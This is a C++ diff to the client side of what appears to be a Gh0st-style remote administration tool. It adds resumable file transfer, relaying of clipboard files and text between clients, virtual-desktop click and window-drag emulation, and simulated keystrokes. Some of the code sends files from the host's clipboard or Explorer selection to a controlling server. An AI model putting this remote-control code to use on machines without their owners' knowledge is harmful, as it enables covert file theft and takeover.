+            if (m_ScreenSpyObject) {
+                m_ScreenSpyObject->SetScrollDetectInterval(scrollInterval);
+                Mprintf("滚动检测间隔(服务端): %d\n", scrollInterval);
+            }
+        } else if (m_ScreenSpyObject && m_ScreenSettings.ScrollDetectInterval > 0) {
+            // 使用本地保存的间隔设置
+            m_ScreenSpyObject->SetScrollDetectInterval(m_ScreenSettings.ScrollDetectInterval);
+            Mprintf("滚动检测间隔(本地): %d\n", m_ScreenSettings.ScrollDetectInterval);
+        }
         NotifyDialogIsOpen();
         break;
     }
@@ -613,12 +1086,12 @@ VOID CScreenManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
             szBuffer[0] = { COMMAND_GET_FOLDER };
             memcpy(szBuffer + 1, str.data(), str.size());
             SendData(szBuffer, 1 + str.size());
-			SAFE_DELETE_ARRAY(szBuffer);
+            SAFE_DELETE_ARRAY(szBuffer);
             break;
         }
         if (SendClientClipboard(ulLength > 1))
             break;
-		files = GetForegroundSelectedFiles(result);
+        files = GetForegroundSelectedFiles(result);
         if (!files.empty()) {
             char h[100] = {};
             memcpy(h, szBuffer + 1, ulLength - 1);
@@ -655,19 +1128,57 @@ VOID CScreenManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
         break;
     }
     case COMMAND_GET_FILE: {
-        // 发送文件
+        // 发送文件 (使用 V2 协议，支持断点续传)
         std::string dir = (char*)(szBuffer + 1);
         char* ptr = (char*)szBuffer + 1 + dir.length() + 1;
-        auto files = *ptr ? ParseMultiStringPath(ptr, ulLength - 2 - dir.length()) : std::vector<std::string>{};
+        auto files = *ptr ? ParseMultiStringPath(ptr, ulLength - 2 - dir.length()) : std::vector<std::string> {};
         if (files.empty()) {
-			BOOL result = 0;
-			files = GetClipboardFiles(result);
+            BOOL result = 0;
+            files = GetClipboardFiles(result);
         }
         if (!files.empty() && !dir.empty()) {
+            // 断点续传：先收集文件信息
+            std::vector<std::pair<std::string, uint64_t>> fileInfos;
+            std::string rootDir = GetCommonRoot(files);
+            for (size_t i = 0; i < files.size(); i++) {
+                std::string relPath = GetRelativePath(rootDir, files[i]);
+                std::string targetPath = dir + relPath;
+                // 获取文件大小
+                HANDLE hFile = CreateFileA(files[i].c_str(), GENERIC_READ, FILE_SHARE_READ,
+                    nullptr, OPEN_EXISTING, 0, nullptr);
+                if (hFile != INVALID_HANDLE_VALUE) {
+                    LARGE_INTEGER size;
+                    GetFileSizeEx(hFile, &size);
+                    CloseHandle(hFile);
+                    fileInfos.push_back({targetPath, (uint64_t)size.QuadPart});
+                }
+            }
+
+            // 生成传输ID（需要在查询和传输中使用相同的ID）
+            uint64_t transferID = GenerateTransferID();
+
+            // 发送续传查询（不在这里等待，在传输线程中等待）
+            bool queryPending = false;
+            if (!fileInfos.empty()) {
+                auto queryPkt = BuildResumeQuery(transferID, m_MyClientID, 0, fileInfos);
+                if (!queryPkt.empty()) {
+                    m_ClientObject->Send2Server((char*)queryPkt.data(), (int)queryPkt.size());
+                    Mprintf("[Resume] 发送续传查询: transferID=%llu, %zu 个文件\n", transferID, fileInfos.size());
+                    queryPending = true;
+                }
+            }
+
+            // 启动传输线程（会在发送前等待偏移响应）
             IOCPClient* pClient = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn);
             if (pClient->ConnectServer(m_ClientObject->ServerIP().c_str(), m_ClientObject->ServerPort())) {
-                std::thread(FileBatchTransferWorker, files, dir, pClient, ::SendData, ::FinishSend,
-                            m_hash, m_hmac).detach();
+                TransferOptionsV2 opts;
+                opts.transferID = transferID;  // 使用之前生成的ID
+                opts.srcClientID = m_MyClientID;
+                opts.dstClientID = 0;  // 发送到主控端
+                opts.enableResume = queryPending;  // 标记需要等待偏移
+
+                std::thread(FileBatchTransferWorkerV2, files, dir, pClient, ::SendDataV2, ::FinishSend,
+                            m_hash, m_hmac, opts).detach();
             } else {
                 delete pClient;
             }
@@ -675,10 +1186,295 @@ VOID CScreenManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
         break;
     }
     case COMMAND_SEND_FILE: {
-        // 接收文件
+        // 接收文件 (V1)
         int n = RecvFileChunk((char*)szBuffer, ulLength, m_conn, RecvData, m_hash, m_hmac);
         if (n) {
             Mprintf("RecvFileChunk failed: %d. hash: %s, hmac: %s\n", n, m_hash.c_str(), m_hmac.c_str());
+        }
+        break;
+    }
+    case COMMAND_SEND_FILE_V2: {
+        // 接收文件 (V2, 支持 C2C)
+        int n = RecvFileChunkV2((char*)szBuffer, ulLength, m_conn, RecvData, m_hash, m_hmac, m_MyClientID);
+        if (n) {
+            Mprintf("RecvFileChunkV2 failed: %d\n", n);
+        }
+        break;
+    }
+    case COMMAND_FILE_RESUME: {
+        // V2 断点续传控制
+        // 注意：批量响应使用 FileResumeResponseV2，单文件使用 FileResumePacketV2
+        // 先尝试解析为批量响应格式
+        std::map<uint32_t, uint64_t> batchOffsets;
+        if (ParseResumeResponse((const char*)szBuffer, ulLength, batchOffsets)) {
+            Mprintf("收到批量续传响应: %zu 个文件\n", batchOffsets.size());
+            SetPendingResumeOffsets(batchOffsets);
+            break;
+        }
+
+        // 不是批量响应，按单文件格式处理
+        FileResumePacketV2* pkt = (FileResumePacketV2*)szBuffer;
+        Mprintf("收到断点续传包: transferID=%llu, flags=0x%04X\n", pkt->transferID, pkt->flags);
+
+        if (pkt->flags & FFV2_RESUME_REQ) {
+            // 对方请求续传信息，获取本地接收状态并发送响应
+            TransferStateInfo info;
+            if (GetTransferState(pkt->transferID, pkt->fileIndex, info)) {
+                // 构建 RESUME_RESP 包
+                size_t rangeDataSize = info.receivedRanges.size() * sizeof(FileRangeV2);
+                size_t totalSize = sizeof(FileResumePacketV2) + rangeDataSize;
+                std::vector<uint8_t> respBuf(totalSize);
+
+                FileResumePacketV2* resp = (FileResumePacketV2*)respBuf.data();
+                resp->cmd = COMMAND_FILE_RESUME;
+                resp->transferID = pkt->transferID;
+                resp->srcClientID = m_MyClientID;  // 我的ID
+                resp->dstClientID = pkt->srcClientID;  // 回复给请求方
+                resp->fileIndex = pkt->fileIndex;
+                resp->fileSize = info.fileSize;
+                resp->receivedBytes = info.receivedBytes;
+                resp->flags = FFV2_RESUME_RESP;
+                resp->rangeCount = (uint16_t)info.receivedRanges.size();
+
+                // 写入区间数据
+                FileRangeV2* ranges = (FileRangeV2*)(respBuf.data() + sizeof(FileResumePacketV2));
+                for (size_t i = 0; i < info.receivedRanges.size(); i++) {
+                    ranges[i].offset = info.receivedRanges[i].first;
+                    ranges[i].length = info.receivedRanges[i].second;
+                }
+
+                Send(respBuf.data(), (UINT)totalSize);
+                Mprintf("已发送续传响应: transferID=%llu, received=%llu/%llu\n",
+                    pkt->transferID, info.receivedBytes, info.fileSize);
+            } else {
+                Mprintf("未找到传输状态: transferID=%llu\n", pkt->transferID);
+            }
+        }
+        else if (pkt->flags & FFV2_RESUME_RESP) {
+            // 单文件续传响应
+            Mprintf("收到续传响应: fileIndex=%u, received=%llu/%llu\n",
+                pkt->fileIndex, pkt->receivedBytes, pkt->fileSize);
+
+            // 解析已接收区间
+            uint64_t transferID, fileSize;
+            std::vector<std::pair<uint64_t, uint64_t>> receivedRanges;
+            if (ParseResumePacket((const char*)szBuffer, ulLength, transferID, fileSize, receivedRanges)) {
+                // 获取本地发送状态（需要知道原始文件路径和目标名称）
+                TransferStateInfo sendInfo;
+                if (GetTransferState(transferID, pkt->fileIndex, sendInfo)) {
+                    // 使用新连接从断点继续发送
+                    TransferOptionsV2 opts;
+                    opts.transferID = transferID;
+                    opts.srcClientID = m_MyClientID;
+                    opts.dstClientID = pkt->srcClientID;
+                    opts.enableResume = true;
+
+                    // 获取目标文件名（从文件路径提取）
+                    std::string targetName = sendInfo.filePath;
+                    size_t lastSlash = targetName.find_last_of("\\/");
+                    if (lastSlash != std::string::npos) {
+                        targetName = targetName.substr(lastSlash + 1);
+                    }
+
+                    IOCPClient* pClient = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn);
+                    if (pClient->ConnectServer(m_ClientObject->ServerIP().c_str(), m_ClientObject->ServerPort())) {
+                        std::thread([=]() {
+                            FileSendFromOffset(sendInfo.filePath, targetName, fileSize,
+                                receivedRanges, pClient,
+                                [](void* user, FileChunkPacketV2* chunk, unsigned char* data, int size) -> bool {
+                                    IOCPClient* client = (IOCPClient*)user;
+                                    return client->Send2Server((char*)data, size) != FALSE;
+                                },
+                                opts);
+                            delete pClient;
+                        }).detach();
+                        Mprintf("开始续传: transferID=%llu, 跳过 %zu 个区间\n", transferID, receivedRanges.size());
+                    } else {
+                        delete pClient;
+                        Mprintf("续传连接失败\n");
+                    }
+                }
+            }
+        }
+        else if (pkt->flags & FFV2_CANCEL) {
+            // 取消传输：通知发送线程停止
+            CancelTransfer(pkt->transferID);
+            CleanupResumeState(pkt->transferID);
+            Mprintf("传输已取消: transferID=%llu\n", pkt->transferID);
+        }
+        break;
+    }
+    case COMMAND_FILE_COMPLETE_V2: {
+        // C2C 文件完成校验
+        if (ulLength < sizeof(FileCompletePacketV2)) break;
+        const FileCompletePacketV2* completePkt = (const FileCompletePacketV2*)szBuffer;
+        bool verifyOk = HandleFileCompleteV2((const char*)szBuffer, ulLength, m_MyClientID);
+        Mprintf("[C2C] 文件校验%s: transferID=%llu, fileIndex=%u\n",
+            verifyOk ? "通过" : "失败", completePkt->transferID, completePkt->fileIndex);
+        break;
+    }
+    case COMMAND_FILE_QUERY_RESUME: {
+        // C2C 断点续传查询
+        Mprintf("[C2C] 收到断点续传查询\n");
+        auto response = HandleResumeQuery((const char*)szBuffer, ulLength);
+        if (!response.empty()) {
+            m_ClientObject->Send2Server((char*)response.data(), (int)response.size());
+            Mprintf("[C2C] 已响应断点续传查询: %zu 字节\n", response.size());
+        }
+        break;
+    }
+    case COMMAND_C2C_TEXT: {
+        // C2C 文本剪贴板: [cmd:1][dstClientID:8][textLen:4][text:N]
+        if (ulLength < 13) break;
+        uint32_t textLen;
+        memcpy(&textLen, szBuffer + 9, 4);
+        if (ulLength < 13 + textLen) break;
+
+        // UTF-8 文本转换为 Unicode 并设置剪贴板
+        std::string utf8Text((const char*)szBuffer + 13, textLen);
+        int wideLen = MultiByteToWideChar(CP_UTF8, 0, utf8Text.c_str(), -1, NULL, 0);
+        if (wideLen > 0) {
+            std::wstring wideText(wideLen, 0);
+            MultiByteToWideChar(CP_UTF8, 0, utf8Text.c_str(), -1, &wideText[0], wideLen);
+
+            if (::OpenClipboard(NULL)) {
+                ::EmptyClipboard();
+                HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, wideLen * sizeof(wchar_t));
+                if (hGlobal) {
+                    wchar_t* pDst = (wchar_t*)GlobalLock(hGlobal);
+                    if (pDst) {
+                        wcscpy(pDst, wideText.c_str());
+                        GlobalUnlock(hGlobal);
+                        SetClipboardData(CF_UNICODETEXT, hGlobal);
+                        Mprintf("[C2C] 收到文本: %u 字节\n", textLen);
+
+                        // 模拟 Ctrl+V 完成粘贴（因为原始 Ctrl+V 被服务端拦截了）
+                        ::CloseClipboard();
+                        INPUT inputs[4] = {};
+                        inputs[0].type = INPUT_KEYBOARD;
+                        inputs[0].ki.wVk = VK_CONTROL;
+                        inputs[1].type = INPUT_KEYBOARD;
+                        inputs[1].ki.wVk = 'V';
+                        inputs[2].type = INPUT_KEYBOARD;
+                        inputs[2].ki.wVk = 'V';
+                        inputs[2].ki.dwFlags = KEYEVENTF_KEYUP;
+                        inputs[3].type = INPUT_KEYBOARD;
+                        inputs[3].ki.wVk = VK_CONTROL;
+                        inputs[3].ki.dwFlags = KEYEVENTF_KEYUP;
+                        SendInput(4, inputs, sizeof(INPUT));
+                        break;
+                    } else {
+                        GlobalFree(hGlobal);
+                    }
+                }
+                ::CloseClipboard();
+            }
+        }
+        break;
+    }
+    case COMMAND_CLIPBOARD_V2: {
+        // V2 C2C 剪贴板请求：被请求发送剪贴板文件到另一个客户端
+        ClipboardRequestV2* req = (ClipboardRequestV2*)szBuffer;
+        Mprintf("收到 C2C 剪贴板请求: dst=%llu, transferID=%llu\n", req->dstClientID, req->transferID);
+
+        // 从请求包中提取认证信息（与 KernelManager 保持一致）
+        std::string hash(req->hash, 64);
+        std::string hmac(req->hmac, 16);
+
+        // 获取剪贴板文件
+        int result = 0;
+        auto files = GetClipboardFiles(result);
+        if (files.empty()) {
+            files = GetForegroundSelectedFiles(result);
+        }
+
+        if (!files.empty()) {
+            // C2C: 不指定目标目录，由接收方决定
+            std::string targetDir = "";
+
+            // 收集文件信息（使用相对路径，接收方使用后缀匹配）
+            std::vector<std::pair<std::string, uint64_t>> fileInfos;
+            std::string rootDir = GetCommonRoot(files);
+            for (size_t i = 0; i < files.size(); i++) {
+                std::string relPath = GetRelativePath(rootDir, files[i]);
+                std::replace(relPath.begin(), relPath.end(), '\\', '/');
+                HANDLE hFile = CreateFileA(files[i].c_str(), GENERIC_READ, FILE_SHARE_READ,
+                    nullptr, OPEN_EXISTING, 0, nullptr);
+                if (hFile != INVALID_HANDLE_VALUE) {
+                    LARGE_INTEGER size;
+                    GetFileSizeEx(hFile, &size);
+                    CloseHandle(hFile);
+                    fileInfos.push_back({relPath, (uint64_t)size.QuadPart});
+                }
+            }
+
+            // 发送续传查询（通过主连接，响应也会回到主连接）
+            bool queryPending = false;
+            if (!fileInfos.empty()) {
+                auto queryPkt = BuildResumeQuery(req->transferID, m_MyClientID, req->dstClientID, fileInfos);
+                if (!queryPkt.empty()) {
+                    m_ClientObject->Send2Server((char*)queryPkt.data(), (int)queryPkt.size());
+                    Mprintf("[C2C] 发送续传查询: transferID=%llu, %zu 个文件, 使用完整路径\n", req->transferID, fileInfos.size());
+                    queryPending = true;
+                }
+            }
+
+            // 使用 V2 发送到目标客户端
+            TransferOptionsV2 opts;
+            opts.transferID = req->transferID;
+            opts.srcClientID = m_MyClientID;  // 我是源
+            opts.dstClientID = req->dstClientID;  // 目标客户端
+            opts.enableResume = queryPending;  // 只有发送了查询才等待响应
+
+            IOCPClient* pClient = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn);
+            if (pClient->ConnectServer(m_ClientObject->ServerIP().c_str(), m_ClientObject->ServerPort())) {
+                std::thread([files, targetDir, pClient, opts, hash, hmac]() {
+                    FileBatchTransferWorkerV2(files, targetDir, pClient,
+                        [](void* user, FileChunkPacketV2* chunk, unsigned char* data, int size) -> bool {
+                            IOCPClient* client = (IOCPClient*)user;
+                            return client->Send2Server((char*)data, size) != FALSE;
+                        },
+                        [](void* user) {
+                            IOCPClient* client = (IOCPClient*)user;
+                            delete client;
+                        },
+                        hash, hmac, opts);
+                }).detach();
+            } else {
+                delete pClient;
+            }
+        } else {
+            // 没有文件，尝试发送剪贴板文本
+            std::string text;
+            if (::OpenClipboard(NULL)) {
+                HGLOBAL hGlobal = GetClipboardData(CF_UNICODETEXT);
+                if (hGlobal) {
+                    wchar_t* pWideStr = (wchar_t*)GlobalLock(hGlobal);
+                    if (pWideStr) {
+                        int len = WideCharToMultiByte(CP_UTF8, 0, pWideStr, -1, NULL, 0, NULL, NULL);
+                        if (len > 0) {
+                            text.resize(len);
+                            WideCharToMultiByte(CP_UTF8, 0, pWideStr, -1, &text[0], len, NULL, NULL);
+                            text.resize(strlen(text.c_str()));
+                        }
+                        GlobalUnlock(hGlobal);
+                    }
+                }
+                ::CloseClipboard();
+            }
+            if (!text.empty()) {
+                // 构建 C2C 文本包: [cmd:1][dstClientID:8][textLen:4][text:N]
+                uint32_t textLen = (uint32_t)text.size();
+                std::vector<char> pkt(1 + 8 + 4 + textLen);
+                pkt[0] = COMMAND_C2C_TEXT;
+                memcpy(&pkt[1], &req->dstClientID, 8);
+                memcpy(&pkt[9], &textLen, 4);
+                memcpy(&pkt[13], text.data(), textLen);
+                m_ClientObject->Send2Server(pkt.data(), (int)pkt.size());
+                Mprintf("[C2C] 发送文本到客户端 %llu (%u 字节)\n", req->dstClientID, textLen);
+            } else {
+                Mprintf("[C2C] 没有找到要发送的文件或文本\n");
+            }
         }
         break;
     }
@@ -792,11 +1588,21 @@ std::string GetTitle(HWND hWnd)
 }
 
 // 辅助判断是否为扩展键
-bool IsExtendedKey(WPARAM vKey) {
+bool IsExtendedKey(WPARAM vKey)
+{
     switch (vKey) {
-    case VK_INSERT: case VK_DELETE: case VK_HOME: case VK_END:
-    case VK_PRIOR:  case VK_NEXT:   case VK_LEFT: case VK_UP:
-    case VK_RIGHT:  case VK_DOWN:   case VK_RCONTROL: case VK_RMENU:
+    case VK_INSERT:
+    case VK_DELETE:
+    case VK_HOME:
+    case VK_END:
+    case VK_PRIOR:
+    case VK_NEXT:
+    case VK_LEFT:
+    case VK_UP:
+    case VK_RIGHT:
+    case VK_DOWN:
+    case VK_RCONTROL:
+    case VK_RMENU:
     case VK_DIVIDE: // 小键盘的 /
         return true;
     default:
@@ -845,6 +1651,12 @@ VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
                 mouseMsg = TRUE;
                 m_point = msg->pt;
                 hWnd = WindowFromPoint(m_point);
+                if (msg->message == WM_LBUTTONDOWN) {
+                    char szClass[64] = {};
+                    if (hWnd) GetClassNameA(hWnd, szClass, sizeof(szClass));
+                    Mprintf("虚拟桌面点击: (%d,%d) hWnd=%p class=%s\n",
+                            m_point.x, m_point.y, hWnd, szClass);
+                }
                 lastPointCopy = m_lastPoint;
                 m_lastPoint = m_point;
                 if (msg->message == WM_RBUTTONDOWN) {
@@ -854,12 +1666,34 @@ VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
                 } else if (msg->message == WM_RBUTTONUP) {
                     m_rmouseDown = FALSE;
                     m_rclickWnd = WindowFromPoint(m_rclickPoint);
-                    // 检查是否为系统菜单（如任务栏）
+                    // 检查是否为任务栏相关窗口
                     char szClass[256] = {};
                     GetClassNameA(m_rclickWnd, szClass, sizeof(szClass));
                     Mprintf("Right click on '%s' %s[%p]\n", szClass, GetTitle(hWnd).c_str(), hWnd);
-                    if (strcmp(szClass, "Shell_TrayWnd") == 0) {
-                        // 触发系统级右键菜单（任务栏）
+
+                    // 检查是否为任务栏或其子窗口
+                    BOOL isTaskbar = (strcmp(szClass, "Shell_TrayWnd") == 0 ||
+                                      strcmp(szClass, "MSTaskListWClass") == 0 ||
+                                      strcmp(szClass, "MSTaskSwWClass") == 0 ||
+                                      strcmp(szClass, "TrayNotifyWnd") == 0 ||
+                                      strcmp(szClass, "Start") == 0 ||
+                                      strcmp(szClass, "ReBarWindow32") == 0);
+                    // 如果不是已知的任务栏类，检查父窗口链
+                    if (!isTaskbar) {
+                        HWND hParent = GetParent(m_rclickWnd);
+                        while (hParent) {
+                            GetClassNameA(hParent, szClass, sizeof(szClass));
+                            if (strcmp(szClass, "Shell_TrayWnd") == 0) {
+                                isTaskbar = TRUE;
+                                break;
+                            }
+                            hParent = GetParent(hParent);
+                        }
+                    }
+
+                    if (isTaskbar) {
+                        // 任务栏右键菜单：使用屏幕坐标发送 WM_CONTEXTMENU
+                        Mprintf("Taskbar right click at: %d, %d\n", m_rclickPoint.x, m_rclickPoint.y);
                         PostMessage(m_rclickWnd, WM_CONTEXTMENU, (WPARAM)m_rclickWnd,
                                     MAKELPARAM(m_rclickPoint.x, m_rclickPoint.y));
                     } else {
@@ -880,6 +1714,54 @@ VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
                         m_rclickWnd = nullptr;
                     }
                     m_lmouseDown = FALSE;
+
+                    // 检查是否为任务栏相关窗口
+                    char szClass[256] = {};
+                    GetClassNameA(hWnd, szClass, sizeof(szClass));
+                    BOOL isTaskbar = (strcmp(szClass, "Shell_TrayWnd") == 0 ||
+                                      strcmp(szClass, "MSTaskListWClass") == 0 ||
+                                      strcmp(szClass, "MSTaskSwWClass") == 0 ||
+                                      strcmp(szClass, "TrayNotifyWnd") == 0 ||
+                                      strcmp(szClass, "ReBarWindow32") == 0);
+                    if (!isTaskbar) {
+                        HWND hParent = GetParent(hWnd);
+                        while (hParent) {
+                            GetClassNameA(hParent, szClass, sizeof(szClass));
+                            if (strcmp(szClass, "Shell_TrayWnd") == 0) {
+                                isTaskbar = TRUE;
+                                break;
+                            }
+                            hParent = GetParent(hParent);
+                        }
+                    }
+                    if (isTaskbar) {
+                        // 任务栏左键点击：需要获取输入权限才能正确模拟点击
+                        Mprintf("Taskbar left click at: %d, %d on %s\n", m_point.x, m_point.y, szClass);
+
+                        // 获取任务栏线程并附加输入
+                        HWND hTaskbar = FindWindowA("Shell_TrayWnd", NULL);
+                        if (hTaskbar) {
+                            DWORD taskbarThreadId = GetWindowThreadProcessId(hTaskbar, NULL);
+                            DWORD currentThreadId = GetCurrentThreadId();
+
+                            // 允许设置前台窗口
+                            AllowSetForegroundWindow(ASFW_ANY);
+
+                            // 附加到任务栏线程的输入队列
+                            AttachThreadInput(currentThreadId, taskbarThreadId, TRUE);
+
+                            // 模拟鼠标点击
+                            SetCursorPos(m_point.x, m_point.y);
+                            mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
+                            Sleep(80);
+                            mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
+
+                            // 分离输入队列
+                            AttachThreadInput(currentThreadId, taskbarThreadId, FALSE);
+                        }
+                        continue;
+                    }
+
                     LRESULT lResult = SendMessageA(hWnd, WM_NCHITTEST, NULL, msg->lParam);
                     switch (lResult) {
                     case HTTRANSPARENT: {
@@ -912,6 +1794,84 @@ VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
                 } else if (msg->message == WM_LBUTTONDOWN) {
                     m_lmouseDown = TRUE;
                     m_hResMoveWindow = NULL;
+                    // 获取顶层窗口来判断点击位置
+                    HWND hTopWnd = GetAncestor(hWnd, GA_ROOT);
+                    if (!hTopWnd) hTopWnd = hWnd;
+                    // 在按下时就记录操作类型，避免移动后误判为边框调整
+                    m_resMoveType = SendMessageA(hTopWnd, WM_NCHITTEST, NULL, msg->lParam);
+
+                    // 修正现代 UI (WinUI 3) 标题栏检测和 DWM 阴影误判
+                    RECT frameRect;
+                    if (SUCCEEDED(DwmGetWindowAttribute(hTopWnd, DWMWA_EXTENDED_FRAME_BOUNDS,
+                            &frameRect, sizeof(frameRect)))) {
+                        int captionHeight = GetSystemMetrics(SM_CYCAPTION) + GetSystemMetrics(SM_CYFRAME) + 8;
+                        int relX = m_point.x - frameRect.left;  // 相对于窗口左边的 X 坐标
+                        int relY = m_point.y - frameRect.top;   // 相对于窗口顶部的 Y 坐标
+                        Mprintf("点击位置: relX=%d, relY=%d, captionHeight=%d\n", relX, relY, captionHeight);
+
+                        // Windows 11 文件管理器工具栏按钮检测（在标题栏下方的工具栏区域）
+                        // 工具栏 Y 范围：captionHeight 到 captionHeight+50 (大约 35-85)
+                        if (relY >= captionHeight && relY < captionHeight + 50 && relX >= 0 && relX < 160) {
+                            // 工具栏按钮区域（返回、前进、向上）
+                            BYTE vkKey = 0;
+                            const char* btnName = NULL;
+                            if (relX < 50) {
+                                vkKey = VK_LEFT;  // 返回：Alt + Left
+                                btnName = "返回";
+                            } else if (relX < 100) {
+                                vkKey = VK_RIGHT; // 前进：Alt + Right
+                                btnName = "前进";
+                            } else if (relX < 160) {
+                                vkKey = VK_UP;    // 向上：Alt + Up
+                                btnName = "向上";
+                            }
+                            if (vkKey) {
+                                Mprintf("工具栏按钮点击: %s (relX=%d, relY=%d)\n", btnName, relX, relY);
+
+                                // 方法1: 尝试 WM_APPCOMMAND (浏览器导航命令)
+                                #define APPCOMMAND_BROWSER_BACKWARD 1
+                                #define APPCOMMAND_BROWSER_FORWARD  2
+                                #define FAPPCOMMAND_KEY 0x8000
+
+                                if (vkKey == VK_LEFT) {
+                                    // 返回
+                                    LPARAM cmd = MAKELPARAM(0, APPCOMMAND_BROWSER_BACKWARD | FAPPCOMMAND_KEY);
+                                    SendMessage(hTopWnd, WM_APPCOMMAND, (WPARAM)hTopWnd, cmd);
+                                } else if (vkKey == VK_RIGHT) {
+                                    // 前进
+                                    LPARAM cmd = MAKELPARAM(0, APPCOMMAND_BROWSER_FORWARD | FAPPCOMMAND_KEY);
+                                    SendMessage(hTopWnd, WM_APPCOMMAND, (WPARAM)hTopWnd, cmd);
+                                } else if (vkKey == VK_UP) {
+                                    // 向上 - 没有 APPCOMMAND，尝试多种方法
+                                    SetForegroundWindow(hTopWnd);
+
+                                    // 方法1: 发送到点击的子窗口
+                                    PostMessage(hWnd, WM_SYSKEYDOWN, VK_UP, (1 << 29) | (MapVirtualKey(VK_UP, 0) << 16) | 1);
+                                    PostMessage(hWnd, WM_SYSKEYUP, VK_UP, (1 << 29) | (MapVirtualKey(VK_UP, 0) << 16) | (3 << 30) | 1);
+
+                                    // 方法2: 也发送到顶层窗口
+                                    PostMessage(hTopWnd, WM_SYSKEYDOWN, VK_UP, (1 << 29) | (MapVirtualKey(VK_UP, 0) << 16) | 1);
+                                    PostMessage(hTopWnd, WM_SYSKEYUP, VK_UP, (1 << 29) | (MapVirtualKey(VK_UP, 0) << 16) | (3 << 30) | 1);
+                                }
+                                continue;
+                            }
+                        }
+
+                        // 检查是否在标题栏拖动区域
+                        BOOL inCaptionArea = (relY >= 0 && relY < captionHeight &&
+                                              relX >= 140 && m_point.x < frameRect.right - 150);
+                        if (inCaptionArea) {
+                            // WinUI 3 自定义标题栏返回 HTCLIENT，强制改为 HTCAPTION
+                            if (m_resMoveType == HTCLIENT) {
+                                m_resMoveType = HTCAPTION;
+                                Mprintf("强制设置为 HTCAPTION (WinUI 3 自定义标题栏)\n");
+                            }
+                            // DWM 阴影导致的边框误判，也改为 HTCAPTION
+                            else if (m_resMoveType == HTTOP || m_resMoveType == HTTOPLEFT || m_resMoveType == HTTOPRIGHT) {
+                                m_resMoveType = HTCAPTION;
+                            }
+                        }
+                    }
                     RECT startButtonRect;
                     HWND hStartButton = FindWindowA((PCHAR)"Button", NULL);
                     GetWindowRect(hStartButton, &startButtonRect);
@@ -930,13 +1890,16 @@ VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
                             continue;
                         }
                     }
+                    // 记录按下时的窗口，用于后续移动/调整（使用顶层窗口）
+                    m_hResMoveWindow = hTopWnd;
+                    Mprintf("记录拖动窗口: hWnd=%p, hTopWnd=%p, m_resMoveType=%d (HTCAPTION=%d)\n",
+                            hWnd, hTopWnd, m_resMoveType, HTCAPTION);
                 } else if (msg->message == WM_MOUSEMOVE) {
-                    if (!m_lmouseDown)
+                    if (!m_lmouseDown || !m_hResMoveWindow) {
+                        // Mprintf("跳过移动: lmouseDown=%d, hResMoveWindow=%p\n", m_lmouseDown, m_hResMoveWindow);
                         continue;
-                    if (!m_hResMoveWindow)
-                        m_resMoveType = SendMessageA(hWnd, WM_NCHITTEST, NULL, msg->lParam);
-                    else
-                        hWnd = m_hResMoveWindow;
+                    }
+                    hWnd = m_hResMoveWindow;
                     int moveX = lastPointCopy.x - m_point.x;
                     int moveY = lastPointCopy.y - m_point.y;
 
@@ -946,6 +1909,7 @@ VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
                     int y = rect.top;
                     int width = rect.right - rect.left;
                     int height = rect.bottom - rect.top;
+                    BOOL needResize = FALSE;
                     switch (m_resMoveType) {
                     case HTCAPTION: {
                         x -= moveX;
@@ -955,19 +1919,23 @@ VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
                     case HTTOP: {
                         y -= moveY;
                         height += moveY;
+                        needResize = TRUE;
                         break;
                     }
                     case HTBOTTOM: {
                         height -= moveY;
+                        needResize = TRUE;
                         break;
                     }
                     case HTLEFT: {
                         x -= moveX;
                         width += moveX;
+                        needResize = TRUE;
                         break;
                     }
                     case HTRIGHT: {
                         width -= moveX;
+                        needResize = TRUE;
                         break;
                     }
                     case HTTOPLEFT: {
@@ -975,30 +1943,35 @@ VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
                         height += moveY;
                         x -= moveX;
                         width += moveX;
+                        needResize = TRUE;
                         break;
                     }
                     case HTTOPRIGHT: {
                         y -= moveY;
                         height += moveY;
                         width -= moveX;
+                        needResize = TRUE;
                         break;
                     }
                     case HTBOTTOMLEFT: {
                         height -= moveY;
                         x -= moveX;
                         width += moveX;
+                        needResize = TRUE;
                         break;
                     }
                     case HTBOTTOMRIGHT: {
                         height -= moveY;
                         width -= moveX;
+                        needResize = TRUE;
                         break;
                     }
                     default:
                         continue;
                     }
-                    MoveWindow(hWnd, x, y, width, height, FALSE);
-                    m_hResMoveWindow = hWnd;
+                    // 使用 SetWindowPos 代替 MoveWindow，支持异步重绘
+                    SetWindowPos(hWnd, NULL, x, y, width, height,
+                        SWP_NOZORDER | SWP_NOACTIVATE | (needResize ? 0 : SWP_NOSIZE));
                     continue;
                 }
                 break;
@@ -1013,7 +1986,14 @@ VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
             }
             if (mouseMsg)
                 msg->lParam = MAKELPARAM(m_point.x, m_point.y);
-            PostMessage(hWnd, msg->message, (WPARAM)msg->wParam, msg->lParam);
+            // 双击需要完整消息序列：LBUTTONDOWN -> LBUTTONDBLCLK -> LBUTTONUP
+            if (msg->message == WM_LBUTTONDBLCLK) {
+                PostMessage(hWnd, WM_LBUTTONDOWN, MK_LBUTTON, msg->lParam);
+                PostMessage(hWnd, WM_LBUTTONDBLCLK, MK_LBUTTON, msg->lParam);
+                PostMessage(hWnd, WM_LBUTTONUP, 0, msg->lParam);
+            } else {
+                PostMessage(hWnd, msg->message, (WPARAM)msg->wParam, msg->lParam);
+            }
         }
         return;
     }
@@ -1038,9 +2018,15 @@ VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
             }
         }
